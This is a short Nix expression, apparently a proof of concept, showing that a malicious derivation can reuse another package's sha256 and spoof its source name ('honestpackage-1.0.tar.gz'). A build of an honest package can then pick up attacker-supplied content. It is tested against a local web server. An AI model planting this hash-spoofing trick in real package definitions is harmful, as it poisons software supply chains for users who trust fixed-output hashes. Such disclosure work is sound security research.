# Fetchurl is a bit harder to attack than fetchzip since the name is contained in the derivation.
# But nothing impossible to overcome as shown here.
# To test this, simulate a web server with:
# $ nix-shell -p simple-http-server
# $ simple-http-server -p 8042
{ pkgs ? import <nixpkgs> {} }:
pkgs.callPackage ({stdenv, fetchurl}:
  let iconpackage = stdenv.mkDerivation rec {
        pname = "iconpackage";
        version = "42.0";
        src = fetchurl { url = "http://localhost:8042/iconpackage-${version}.tar.gz"; name="honestpackage-1.0.tar.gz"; sha256 = "sha256-sq86h8GesGE7OBvJhhMcDqMyS56gwG6zY2bCSreqm+0="; };
        unpackPhase = ''
          tar xf  $src
          ls -al
        '';
        buildPhase = ":";
        installPhase = ''
          mkdir -p $out/share/icons/hicolor/64x64/apps/
          mv myicon.png $out/share/icons/hicolor/64x64/apps/
        '';     
      };
      honestpackage = stdenv.mkDerivation rec {
        pname = "honestpackage";
        version = "1.0";
        src = fetchurl {
          url = "http://localhost:8042/honestpackage-${version}.tar.gz"; # <-- this is NOT controlled by the adversary
          sha256 = "sha256-sq86h8GesGE7OBvJhhMcDqMyS56gwG6zY2bCSreqm+0=";
        };
        unpackPhase = ''
          tar xf  $src
        '';
        buildInputs = [ iconpackage ];
        buildPhase = ":";
        installPhase = ''
          mkdir -p $out/bin
          mv honestpackage.sh $out/bin
        '';
      };
  in honestpackage
) {}
